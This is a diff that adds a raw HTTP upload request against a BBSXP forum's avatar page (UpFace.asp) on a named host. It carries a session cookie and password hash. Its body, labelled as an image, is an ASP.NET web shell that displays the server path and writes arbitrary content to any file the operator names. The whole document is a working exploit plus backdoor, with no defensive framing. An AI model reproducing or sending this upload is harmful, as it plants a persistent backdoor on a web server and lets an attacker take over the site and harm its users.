@@ -1,0 +1,63 @@
+POST /bbsxp/UpFace.asp?menu=up HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*
+Referer: http://www.brave001.com/bbsxp/UpFace.asp
+Accept-Language: zh-cn
+Content-Type: multipart/form-data; boundary=---------------------------7d727125230996
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (Compatible; MSIE 6.0; Windows 5.0; .NET CLR 1.1.4322)
+Host: www.brave001.com
+Content-Length: 1879
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: UserID=12; Userpass=4B63B2E503B25B94709265DDD878AEFB; skins=1; Onlinetime=2007%2D5%2D3+10%3A56%3A52; ASPSESSIONIDAQQDCBCD=EMPHHEKAOBPEGPOINFFPIEJF
+
+-----------------------------7d727125230996
+Content-Disposition: form-data; name="file"; filename="C:\Documents and Settings\Administrator.HACK\桌面\aaa.aspx"
+Content-Type: image/html
+
+<%@ Page language="c#" validateRequest=false %>
+<HTML>
+<HEAD>
+<title>锦衣夜行 QQ:156544632</title>
+<script language="C#" runat="server">
+void Page_Load(object sender, System.EventArgs e)
+{
+string strPath = Server.MapPath(".");
+L3.Text = strPath;
+}
+void Button1_Click(object sender, System.EventArgs e)
+{
+try
+{
+System.IO.FileInfo fil = new System.IO.FileInfo(T1.Text);
+System.IO.StreamWriter sw = fil.CreateText();
+sw.Write(T2.Text);
+sw.Flush();
+sw.Close();
+L4.Text = "OK!";
+}
+catch(Exception ex)
+{
+L4.Text = ex.Message;
+}
+}
+</script>
+</HEAD>
+<body MS_POSITIONING="GridLayout">
+<form id="Form1" method="post" runat="server">
+<asp:Label id="L1" style="Z-INDEX: 101; LEFT: 24px; POSITION: absolute; TOP: 96px" runat="server">本路径:</asp:Label>
+<asp:TextBox id="T1" style="Z-INDEX: 102; LEFT: 144px; POSITION: absolute; TOP: 64px" runat="server"
+Width="376px"></asp:TextBox>
+<asp:Label id="L2" style="Z-INDEX: 103; LEFT: 24px; POSITION: absolute; TOP: 64px" runat="server">存路径:</asp:Label>
+<asp:Label id="L3" style="Z-INDEX: 104; LEFT: 144px; POSITION: absolute; TOP: 96px" runat="server"
+Width="584px"></asp:Label>
+<asp:TextBox id="T2" style="Z-INDEX: 105; LEFT: 24px; POSITION: absolute; TOP: 128px" runat="server"
+Width="504px" Height="344px" TextMode="MultiLine"></asp:TextBox>
+<asp:Button id="Button1" style="Z-INDEX: 106; LEFT: 424px; POSITION: absolute; TOP: 504px" runat="server"
+Width="96px" Text="up" OnClick="Button1_Click"></asp:Button>
+<asp:Label id="L4" style="Z-INDEX: 107; LEFT: 144px; POSITION: absolute; TOP: 24px" runat="server"
+Width="432px"></asp:Label></form>
+</body>
+</HTML>
+
+-----------------------------7d727125230996--
